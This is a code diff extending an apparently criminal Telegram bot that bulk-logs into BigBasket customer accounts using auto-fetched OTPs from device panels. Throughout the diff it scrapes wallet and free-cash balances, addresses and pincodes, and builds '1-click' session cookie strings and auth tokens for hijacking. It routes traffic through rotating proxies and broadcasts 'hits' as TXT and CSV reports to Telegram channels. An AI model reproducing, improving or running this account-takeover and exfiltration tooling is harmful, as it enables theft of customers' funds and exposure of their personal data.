@@ -88,6 +88,61 @@ BB_WALLET_URL = f"{BB_API}/wallet/v1/details"
 BB_MEMBER_URL = f"{BB_API}/ui-svc/v1/member/details"
 BB_DEV_REG = f"{BB_API}/mapi/v4.2.0/register/device/"
 BB_UI_URL = f"{BB_API}/ui-svc/v2/header/?send_door_info=true&app_launch=true"
+BB_ADDRESS_URL = f"{BB_API}/member-tdl/v3/member/address/"
+BB_VOUCHERS_URL = f"{BB_API}/wallet/v1/vouchers"
+
+PROXIES_FILE = os.path.join(CONFIG_DIR, "proxies.txt")
+DEDUP_CACHE_FILE = os.path.join(CONFIG_DIR, "processed_numbers_cache.json")
+
+def get_rotating_proxy() -> Optional[dict]:
+    """Returns a random proxy dict if configured in env or config/proxies.txt (Pure HTTP, 0 Browser)."""
+    env_p = os.environ.get("PROXIES") or os.environ.get("PROXY_URL")
+    if env_p:
+        p_list = [x.strip() for x in env_p.split(",") if x.strip()]
+        if p_list:
+            chosen = random.choice(p_list)
+            return {"http": chosen, "https": chosen}
+    if os.path.exists(PROXIES_FILE):
+        try:
+            with open(PROXIES_FILE, "r") as f:
+                lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+                if lines:
+                    chosen = random.choice(lines)
+                    if not chosen.startswith("http"):
+                        chosen = f"http://{chosen}"
+                    return {"http": chosen, "https": chosen}
+        except Exception:
+            pass
+    return None
+
+def is_recently_processed(phone: str, hours: int = 24) -> bool:
+    """Checks if a phone number was already checked within the last N hours."""
+    if not os.path.exists(DEDUP_CACHE_FILE):
+        return False
+    try:
+        with open(DEDUP_CACHE_FILE, "r") as f:
+            data = json.load(f)
+            ts = data.get(phone)
+            if ts and (time.time() - ts) < (hours * 3600):
+                return True
+    except Exception:
+        pass
+    return False
+
+def mark_phone_processed(phone: str):
+    """Records phone check timestamp in persistent cache."""
+    try:
+        cache = {}
+        if os.path.exists(DEDUP_CACHE_FILE):
+            with open(DEDUP_CACHE_FILE, "r") as f:
+                cache = json.load(f)
+        cache[phone] = int(time.time())
+        cutoff = time.time() - (48 * 3600)
+        cache = {k: v for k, v in cache.items() if v > cutoff}
+        with open(DEDUP_CACHE_FILE, "w") as f:
+            json.dump(cache, f)
+    except Exception:
+        pass
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
@@ -455,8 +510,14 @@ def broadcast_hit_to_channels(hit_card: str, chat_id: int):
 
 # ============ BIGBASKET CLIENT ============
 class BigBasketClient:
-    def __init__(self):
+    def __init__(self, proxy: Optional[dict] = None):
         self.s = cffi_requests.Session(impersonate="chrome120")
+        if proxy:
+            self.s.proxies = proxy
+        else:
+            p = get_rotating_proxy()
+            if p:
+                self.s.proxies = p
         profiles = [
             {"make": "Samsung", "model": "SM-A536E", "os": "13"},
             {"make": "Google", "model": "Pixel 7", "os": "14"},
@@ -468,6 +529,7 @@ class BigBasketClient:
         self.p = random.choice(profiles)
         self.did = "".join(random.choices("0123456789abcdef", k=16))
         self.token = ""
+        self.cookie_string = ""
         self.h = {
             "User-Agent": f"BB Android/v8.38.0/os {self.p['os']}",
             "Content-Type": "application/json",
@@ -590,6 +652,15 @@ class BigBasketClient:
                     self.s.cookies.set("customer_hash", d["customer_hash"], domain=".bigbasket.com")
                 if d.get("m_id"):
                     self.s.cookies.set("_bb_mid", d["m_id"], domain=".bigbasket.com")
+
+                # Build 1-click browser cookie string
+                cookie_parts = []
+                for k in ["_bb_mid", "BBAUTHTOKEN", "customer_hash", "csurftoken"]:
+                    val = self.s.cookies.get(k) or (d.get("m_id") if k == "_bb_mid" else (token if k == "BBAUTHTOKEN" else d.get("customer_hash") if k == "customer_hash" else None))
+                    if val:
+                        cookie_parts.append(f"{k}={val}")
+                self.cookie_string = "; ".join(cookie_parts)
+                d["cookie_string"] = self.cookie_string
                 return True, token, d
             err_msg = ""
             if "errors" in d and isinstance(d["errors"], list) and len(d["errors"]) > 0:
@@ -597,6 +668,29 @@ class BigBasketClient:
             return False, err_msg or "Invalid OTP", d
         except Exception as e:
             return False, str(e), {}
+
+    def get_address_info(self) -> dict:
+        """Fetches primary delivery address, city, and pincode via BB REST API."""
+        addr_info = {"city": "N/A", "pincode": "N/A", "address": "N/A"}
+        try:
+            h = self.h.copy()
+            if self.token:
+                h["x-auth-token"] = self.token
+                h["Authorization"] = f"Bearer {self.token}"
+            r = self.s.get(BB_ADDRESS_URL, headers=h, timeout=10)
+            if r.status_code == 200:
+                data = r.json()
+                addresses = data.get("addresses") or (data if isinstance(data, list) else [])
+                if addresses and isinstance(addresses, list):
+                    primary = next((a for a in addresses if a.get("is_default") or a.get("default")), addresses[0])
+                    addr_info["city"] = primary.get("city_name") or primary.get("city") or "N/A"
+                    addr_info["pincode"] = str(primary.get("pincode") or primary.get("pin") or "N/A")
+                    addr_line = primary.get("street") or primary.get("address_line1") or primary.get("area") or ""
+                    if addr_line:
+                        addr_info["address"] = f"{addr_line}, {addr_info['city']} - {addr_info['pincode']}"
+        except Exception:
+            pass
+        return addr_info
 
     def wallet(self) -> Optional[dict]:
         try:
@@ -613,12 +707,22 @@ class BigBasketClient:
                 "wallet_balance": 0.0,
                 "current_wallet_balance": 0.0,
                 "free_cash": 0.0,
+                "free_cash_expiry": "N/A",
+                "min_order_value": "N/A",
                 "neucoins": 0,
                 "name": "",
                 "email": "",
+                "city": "N/A",
+                "pincode": "N/A",
+                "address": "N/A",
+                "cookie_string": getattr(self, "cookie_string", ""),
                 "vouchers_count": 0,
                 "raw_details": {}
             }
+
+            expiry_str = "N/A"
+            min_order_str = "N/A"
+            direct_free_cash = 0.0
 
             # 1. Primary Wallet Endpoint (wallet/v1/details)
             r = self.s.get(BB_WALLET_URL, headers=h, timeout=15)
@@ -626,16 +730,13 @@ class BigBasketClient:
                 try:
                     d = r.json()
                     result["raw_details"] = d
-                    # Total Balance
                     result["total_balance"] = float(d.get("total_balance") or d.get("balance") or 0.0)
                     
-                    # Main Wallet Cash (deposited/refunded)
                     result["current_wallet_balance"] = float(
                         d.get("current_wallet_balance") or d.get("usable_balance") or d.get("wallet_balance") or 0.0
                     )
                     result["wallet_balance"] = result["current_wallet_balance"]
 
-                    # Free Cash / Promotional Cash Extraction
                     direct_free_cash = float(
                         d.get("free_cash") 
                         or d.get("freecash") 
@@ -647,7 +748,6 @@ class BigBasketClient:
                         or 0.0
                     )
                     
-                    # Nested wallet / promotion objects check
                     if direct_free_cash == 0.0 and isinstance(d.get("wallet"), dict):
                         w_sub = d["wallet"]
                         direct_free_cash = float(
@@ -659,15 +759,21 @@ class BigBasketClient:
                             p_sub.get("free_cash") or p_sub.get("total_amount") or p_sub.get("amount") or 0.0
                         )
                     
-                    # Active vouchers list check
                     vouchers = d.get("vouchers") or []
-                    if isinstance(vouchers, list):
+                    if isinstance(vouchers, list) and vouchers:
                         result["vouchers_count"] = len(vouchers)
                         voucher_sum = sum(float(v.get("amount") or v.get("value") or 0.0) for v in vouchers if isinstance(v, dict))
                         if direct_free_cash == 0.0 and voucher_sum > 0:
                             direct_free_cash = voucher_sum
+                        for v in vouchers:
+                            if isinstance(v, dict):
+                                v_exp = v.get("valid_till") or v.get("expiry_date") or v.get("expires_on") or v.get("valid_to")
+                                if v_exp and expiry_str == "N/A":
+                                    expiry_str = str(v_exp)
+                                v_min = v.get("min_order_value") or v.get("min_order") or v.get("min_cart_value")
+                                if v_min and min_order_str == "N/A":
+                                    min_order_str = f"₹{v_min}"
 
-                    result["free_cash"] = direct_free_cash
                     result["neucoins"] = int(d.get("neucoins") or d.get("points") or d.get("tata_neu_coins") or 0)
                 except Exception:
                     pass
@@ -689,18 +795,39 @@ class BigBasketClient:
                         if result["current_wallet_balance"] == 0.0:
                             result["current_wallet_balance"] = float(w.get("current_wallet_balance") or w.get("usable_balance") or 0.0)
                             result["wallet_balance"] = result["current_wallet_balance"]
-                        if result["free_cash"] == 0.0:
-                            result["free_cash"] = float(w.get("free_cash") or w.get("promotional_balance") or w.get("promo_balance") or w.get("bb_cash") or 0.0)
+                        if direct_free_cash == 0.0:
+                            direct_free_cash = float(w.get("free_cash") or w.get("promotional_balance") or w.get("promo_balance") or w.get("bb_cash") or 0.0)
                         if result["neucoins"] == 0:
                             result["neucoins"] = int(w.get("neucoins") or w.get("points") or 0)
                     
-                    if "promotions" in d2 and isinstance(d2["promotions"], dict) and result["free_cash"] == 0.0:
-                        result["free_cash"] = float(d2["promotions"].get("free_cash") or d2["promotions"].get("total_amount") or 0.0)
+                    if "promotions" in d2 and isinstance(d2["promotions"], dict) and direct_free_cash == 0.0:
+                        direct_free_cash = float(d2["promotions"].get("free_cash") or d2["promotions"].get("total_amount") or 0.0)
                 except Exception:
                     pass
 
-            # 3. Header API fallback (ui-svc/v2/header)
-            if result["total_balance"] == 0.0 and result["free_cash"] == 0.0:
+            # 3. Dedicated Vouchers REST Endpoint (wallet/v1/vouchers)
+            try:
+                rv = self.s.get(BB_VOUCHERS_URL, headers=h, timeout=8)
+                if rv.status_code == 200:
+                    v_data = rv.json()
+                    v_list = v_data.get("vouchers") or v_data.get("coupons") or (v_data if isinstance(v_data, list) else [])
+                    if isinstance(v_list, list):
+                        for v in v_list:
+                            if isinstance(v, dict):
+                                amt = float(v.get("amount") or v.get("value") or 0.0)
+                                if direct_free_cash == 0.0 and amt > 0:
+                                    direct_free_cash += amt
+                                v_exp = v.get("valid_till") or v.get("expiry_date") or v.get("expires_on")
+                                if v_exp and expiry_str == "N/A":
+                                    expiry_str = str(v_exp)
+                                v_min = v.get("min_order_value") or v.get("min_order") or v.get("min_cart_value")
+                                if v_min and min_order_str == "N/A":
+                                    min_order_str = f"₹{v_min}"
+            except Exception:
+                pass
+
+            # 4. Header API fallback (ui-svc/v2/header)
+            if result["total_balance"] == 0.0 and direct_free_cash == 0.0:
                 try:
                     r3 = self.s.get(BB_UI_URL, headers=h, timeout=10)
                     if r3.status_code == 200:
@@ -712,19 +839,27 @@ class BigBasketClient:
                             if result["current_wallet_balance"] == 0.0:
                                 result["current_wallet_balance"] = float(w3.get("current_wallet_balance") or w3.get("usable_balance") or 0.0)
                                 result["wallet_balance"] = result["current_wallet_balance"]
-                            if result["free_cash"] == 0.0:
-                                result["free_cash"] = float(w3.get("free_cash") or w3.get("promotional_balance") or 0.0)
+                            if direct_free_cash == 0.0:
+                                direct_free_cash = float(w3.get("free_cash") or w3.get("promotional_balance") or 0.0)
                 except Exception:
                     pass
 
-            # 4. Mathematical Deductions & Normalizations
-            # If total_balance exceeds wallet_balance and free_cash wasn't directly isolated, the difference IS Free Cash!
-            if result["total_balance"] > result["current_wallet_balance"] and result["free_cash"] == 0.0:
-                result["free_cash"] = round(result["total_balance"] - result["current_wallet_balance"], 2)
+            # 5. Mathematical Deductions & Normalizations
+            if result["total_balance"] > result["current_wallet_balance"] and direct_free_cash == 0.0:
+                direct_free_cash = round(result["total_balance"] - result["current_wallet_balance"], 2)
             
-            # If free_cash exists but total_balance was 0 or didn't include it
-            if result["free_cash"] > 0.0 and result["total_balance"] < (result["current_wallet_balance"] + result["free_cash"]):
-                result["total_balance"] = round(result["current_wallet_balance"] + result["free_cash"], 2)
+            if direct_free_cash > 0.0 and result["total_balance"] < (result["current_wallet_balance"] + direct_free_cash):
+                result["total_balance"] = round(result["current_wallet_balance"] + direct_free_cash, 2)
+
+            result["free_cash"] = direct_free_cash
+            result["free_cash_expiry"] = expiry_str
+            result["min_order_value"] = min_order_str
+
+            # 6. Fetch Address Information via REST API
+            addr = self.get_address_info()
+            result["city"] = addr.get("city", "N/A")
+            result["pincode"] = addr.get("pincode", "N/A")
+            result["address"] = addr.get("address", "N/A")
 
             return result
         except Exception:
@@ -1436,6 +1571,15 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
         dev_name = item.get("device", "Unknown Device")
         base_path = item.get("base_path", "clients")
 
+        # 24h Duplicate Cache check
+        if is_recently_processed(phone):
+            with scan_lock:
+                if chat_id in active_scans:
+                    active_scans[chat_id]["processed"] += 1
+                    active_scans[chat_id]["processed_phones"].append(phone)
+                    save_scan_state(chat_id)
+            return
+
         dev_lock = get_device_lock(did) if did else None
         if dev_lock:
             dev_lock.acquire()
@@ -1500,6 +1644,7 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
 
             # 5. Auto-Verify OTP Login
             ok_verify, token_or_err, auth_data = bb.verify(phone, otp_code, ref_id)
+            mark_phone_processed(phone)
             if not ok_verify:
                 with scan_lock:
                     if chat_id in active_scans:
@@ -1516,15 +1661,25 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
             wb = w.get("current_wallet_balance", 0.0) if w else 0.0
             coins = w.get("neucoins", 0) if w else 0
             cust_name = w.get("name") if w and w.get("name") else "BigBasket User"
+            exp_date = w.get("free_cash_expiry", "N/A") if w else "N/A"
+            min_val = w.get("min_order_value", "N/A") if w else "N/A"
+            city = w.get("city", "N/A") if w else "N/A"
+            pin = w.get("pincode", "N/A") if w else "N/A"
+            cookie_str = auth_data.get("cookie_string") or getattr(bb, "cookie_string", "")
 
             hit_record = {
                 "phone": phone,
                 "total_balance": tb,
                 "free_cash": fc,
+                "free_cash_expiry": exp_date,
+                "min_order_value": min_val,
                 "wallet_balance": wb,
                 "neucoins": coins,
+                "city": city,
+                "pincode": pin,
                 "name": cust_name,
                 "token": bb.token,
+                "cookie_string": cookie_str,
                 "device": dev_name,
                 "dev_id": did,
                 "panel": item.get("panel_name") or fb_url,
@@ -1546,17 +1701,32 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
 
             # Instant notification on Hit (Triggers on Free Cash, Wallet Cash or NeuCoins)
             if is_hit:
+                fc_lines = ""
+                if fc > 0:
+                    fc_lines = f"🆓 <b>Free Cash:</b> <b>₹{fc:.2f}</b>\n"
+                    if exp_date and exp_date != "N/A":
+                        fc_lines += f"⏳ <b>Free Cash Expiry:</b> <code>{esc(exp_date)}</code>\n"
+                    if min_val and min_val != "N/A":
+                        fc_lines += f"🛒 <b>Min Order Value:</b> <code>{esc(min_val)}</code>\n"
+                else:
+                    fc_lines = f"🆓 <b>Free Cash:</b> <b>₹0.00</b>\n"
+
+                cookie_disp = cookie_str if cookie_str else "N/A"
+
                 hit_card = (
                     f"🎉 <b>🔥 BIGBASKET HIT FOUND!</b>\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
                     f"👤 <b>Customer:</b> <b>{esc(cust_name)}</b>\n"
                     f"💰 <b>Total Balance:</b> <b>₹{tb:.2f}</b>\n"
-                    f"🆓 <b>Free Cash:</b> <b>₹{fc:.2f}</b>\n"
+                    f"{fc_lines}"
                     f"👛 <b>Main Wallet:</b> <b>₹{wb:.2f}</b>\n"
                     f"🪙 <b>NeuCoins:</b> <b>{coins}</b>\n"
+                    f"📍 <b>Location:</b> <code>{esc(city)} ({esc(pin)})</code>\n"
                     f"📟 <b>Device:</b> <code>{esc(dev_name)}</code> ({esc(slot)})\n"
                     f"🌐 <b>Panel:</b> <code>{esc(item.get('panel_name') or fb_url)}</code>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"🍪 <b>1-Click Cookie:</b>\n<code>{esc(cookie_disp)}</code>\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"✅ <i>Saved to report & broadcast to channels!</i>"
                 )
@@ -1619,12 +1789,19 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
                 f.write(f"👤 Customer:      {h.get('name', 'N/A')}\n")
                 f.write(f"💰 Total Balance: ₹{h.get('total_balance', 0.0):.2f}\n")
                 f.write(f"🆓 Free Cash:     ₹{h.get('free_cash', 0.0):.2f}\n")
+                if h.get('free_cash_expiry') and h.get('free_cash_expiry') != 'N/A':
+                    f.write(f"⏳ Free Cash Exp: {h.get('free_cash_expiry')}\n")
+                if h.get('min_order_value') and h.get('min_order_value') != 'N/A':
+                    f.write(f"🛒 Min Order:     {h.get('min_order_value')}\n")
                 f.write(f"👛 Main Wallet:   ₹{h.get('wallet_balance', 0.0):.2f}\n")
                 f.write(f"🪙 NeuCoins:      {h.get('neucoins', 0)}\n")
+                f.write(f"📍 Location:      {h.get('city', 'N/A')} ({h.get('pincode', 'N/A')})\n")
                 f.write(f"📟 Device:        {h.get('device', 'N/A')} ({h.get('slot', 'SIM')})\n")
                 f.write(f"🆔 Dev ID:        {h.get('dev_id', 'N/A')}\n")
                 f.write(f"🌐 Panel:         {h.get('panel', 'N/A')}\n")
                 f.write(f"🔑 Auth Token:    {h.get('token', '')}\n")
+                if h.get('cookie_string'):
+                    f.write(f"🍪 Cookie Login:  {h.get('cookie_string')}\n")
                 f.write(f"🕒 Checked At:    {h.get('checked_at', '')}\n")
                 f.write("────────────────────────────────────────────────\n\n")
         else:
@@ -1652,17 +1829,48 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
     )
     safe_send(chat_id, summary_text)
 
-    # Send document to user DM
+    # Generate Excel-compatible CSV report
+    csv_file_path = os.path.join(RESULTS_DIR, f"BB_HITS_{chat_id}_{ts_str}.csv")
     try:
-        with open(hits_file_path, "rb") as doc:
-            bot.send_document(
-                chat_id,
-                doc,
-                caption=f"📄 <b>BB_HITS_{ts_str}.txt</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash",
-                parse_mode="HTML"
-            )
-    except Exception as e:
-        safe_send(chat_id, f"⚠️ Document delivery error: {esc(e)}")
+        with open(csv_file_path, "w", newline="", encoding="utf-8") as f_csv:
+            writer = csv.writer(f_csv)
+            writer.writerow([
+                "Phone", "Customer Name", "Total Balance (INR)", "Free Cash (INR)", 
+                "Free Cash Expiry", "Min Order Value", "Main Wallet (INR)", "NeuCoins", 
+                "City", "Pincode", "Panel", "Device", "Token", "1-Click Cookie String", "Checked At"
+            ])
+            for h in hits:
+                writer.writerow([
+                    h.get("phone", ""),
+                    h.get("name", "BigBasket User"),
+                    f"{h.get('total_balance', 0.0):.2f}",
+                    f"{h.get('free_cash', 0.0):.2f}",
+                    h.get("free_cash_expiry", "N/A"),
+                    h.get("min_order_value", "N/A"),
+                    f"{h.get('wallet_balance', 0.0):.2f}",
+                    h.get("neucoins", 0),
+                    h.get("city", "N/A"),
+                    h.get("pincode", "N/A"),
+                    h.get("panel", "N/A"),
+                    h.get("device", "N/A"),
+                    h.get("token", ""),
+                    h.get("cookie_string", ""),
+                    h.get("checked_at", "")
+                ])
+    except Exception:
+        pass
+
+    # Send documents to user DM
+    for fpath, cap in [
+        (hits_file_path, f"📄 <b>BB_HITS_{ts_str}.txt</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash"),
+        (csv_file_path, f"📊 <b>BB_HITS_{ts_str}.csv (Excel)</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash")
+    ]:
+        try:
+            if os.path.exists(fpath):
+                with open(fpath, "rb") as doc:
+                    bot.send_document(chat_id, doc, caption=cap, parse_mode="HTML")
+        except Exception as e:
+            safe_send(chat_id, f"⚠️ Document delivery error ({os.path.basename(fpath)}): {esc(e)}")
 
     # Send document to storage channel AND Master Universal Channel
     destinations = set()
@@ -1674,15 +1882,21 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
         destinations.add(master_ch)
 
     for dest in destinations:
-        try:
-            with open(hits_file_path, "rb") as doc:
-                bot.send_document(
-                    int(dest) if str(dest).lstrip("-").isdigit() else dest,
-                    doc,
-                    caption=f"📦 <b>[Universal Backup] BB_HITS_{ts_str}.txt</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash"
-                )
-        except Exception:
-            pass
+        for fpath, cap in [
+            (hits_file_path, f"📦 <b>[Universal Backup] BB_HITS_{ts_str}.txt</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash"),
+            (csv_file_path, f"📊 <b>[Universal Backup] BB_HITS_{ts_str}.csv</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash")
+        ]:
+            try:
+                if os.path.exists(fpath):
+                    with open(fpath, "rb") as doc:
+                        bot.send_document(
+                            int(dest) if str(dest).lstrip("-").isdigit() else dest,
+                            doc,
+                            caption=cap,
+                            parse_mode="HTML"
+                        )
+            except Exception:
+                pass
 
     # Show menu again
     show_scanner_menu(chat_id)
@@ -2043,7 +2257,7 @@ def show_export_menu(chat_id: int, message_id: Optional[int] = None):
 
     markup = types.InlineKeyboardMarkup()
     if files:
-        markup.add(types.InlineKeyboardButton("📄 Download Latest Hits (.txt)", callback_data="export_latest_hits"))
+        markup.add(types.InlineKeyboardButton("📥 Download Latest Reports (TXT + CSV)", callback_data="export_latest_hits"))
     markup.add(types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu"))
 
     send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)
@@ -2628,22 +2842,24 @@ def handle_callbacks(call):
 
     # Export Actions
     elif data == "export_latest_hits":
-        files = [f for f in os.listdir(RESULTS_DIR) if f.startswith(f"BB_HITS_{chat_id}_")]
-        if not files:
-            files = [f for f in os.listdir(RESULTS_DIR) if f.startswith("BB_HITS_")]
+        files = [f for f in os.listdir(RESULTS_DIR) if f.startswith(f"BB_HITS_{chat_id}_") or f.startswith("BB_HITS_")]
         files.sort(reverse=True)
         if files:
-            latest = os.path.join(RESULTS_DIR, files[0])
-            try:
-                with open(latest, "rb") as doc:
-                    bot.send_document(
-                        chat_id,
-                        doc,
-                        caption=f"📄 <b>Latest Hits Report:</b> <code>{esc(files[0])}</code>",
-                        parse_mode="HTML"
-                    )
-            except Exception as e:
-                safe_send(chat_id, f"⚠️ Error sending file: {esc(e)}")
+            latest_txt = next((f for f in files if f.endswith(".txt")), None)
+            latest_csv = next((f for f in files if f.endswith(".csv")), None)
+            to_send = [f for f in [latest_txt, latest_csv] if f]
+            for fname in to_send:
+                fpath = os.path.join(RESULTS_DIR, fname)
+                try:
+                    with open(fpath, "rb") as doc:
+                        bot.send_document(
+                            chat_id,
+                            doc,
+                            caption=f"📄 <b>Hits Report:</b> <code>{esc(fname)}</code>",
+                            parse_mode="HTML"
+                        )
+                except Exception as e:
+                    safe_send(chat_id, f"⚠️ Error sending {fname}: {esc(e)}")
         else:
             safe_send(chat_id, "ℹ️ No hits reports available.")
 
@@ -2848,12 +3064,30 @@ def handle_incoming_text(message):
                 safe_send(chat_id, f"❌ <b>Login Failed:</b> {esc(token_or_err)}\nDobara koshish karein ya /start karein.")
                 return
 
+            mark_phone_processed(phone)
             w = bb.wallet()
             tb = w.get("total_balance", 0.0) if w else 0.0
             fc = w.get("free_cash", 0.0) if w else 0.0
             wb = w.get("current_wallet_balance", 0.0) if w else 0.0
             coins = w.get("neucoins", 0) if w else 0
             cust_name = w.get("name") if w and w.get("name") else "BigBasket User"
+            exp_date = w.get("free_cash_expiry", "N/A") if w else "N/A"
+            min_val = w.get("min_order_value", "N/A") if w else "N/A"
+            city = w.get("city", "N/A") if w else "N/A"
+            pin = w.get("pincode", "N/A") if w else "N/A"
+            cookie_str = auth_d.get("cookie_string") or getattr(bb, "cookie_string", "")
+
+            fc_lines = ""
+            if fc > 0:
+                fc_lines = f"🆓 <b>Free Cash:</b> <b>₹{fc:.2f}</b>\n"
+                if exp_date and exp_date != "N/A":
+                    fc_lines += f"⏳ <b>Free Cash Expiry:</b> <code>{esc(exp_date)}</code>\n"
+                if min_val and min_val != "N/A":
+                    fc_lines += f"🛒 <b>Min Order Value:</b> <code>{esc(min_val)}</code>\n"
+            else:
+                fc_lines = f"🆓 <b>Free Cash:</b> <b>₹0.00</b>\n"
+
+            cookie_disp = cookie_str if cookie_str else "N/A"
 
             card = (
                 f"🎉 <b>BIGBASKET WALLET RESULT</b>\n"
@@ -2861,10 +3095,13 @@ def handle_incoming_text(message):
                 f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
                 f"👤 <b>Name:</b> <b>{esc(cust_name)}</b>\n"
                 f"💰 <b>Total Balance:</b> <b>₹{tb:.2f}</b>\n"
-                f"🆓 <b>Free Cash:</b> <b>₹{fc:.2f}</b>\n"
+                f"{fc_lines}"
                 f"👛 <b>Main Wallet:</b> <b>₹{wb:.2f}</b>\n"
                 f"🪙 <b>NeuCoins:</b> <b>{coins}</b>\n"
+                f"📍 <b>Location:</b> <code>{esc(city)} ({esc(pin)})</code>\n"
                 f"🔑 <b>Token:</b> <code>{esc(bb.token[:32])}...</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🍪 <b>1-Click Cookie:</b>\n<code>{esc(cookie_disp)}</code>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"✅ Checked at: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}"
             )
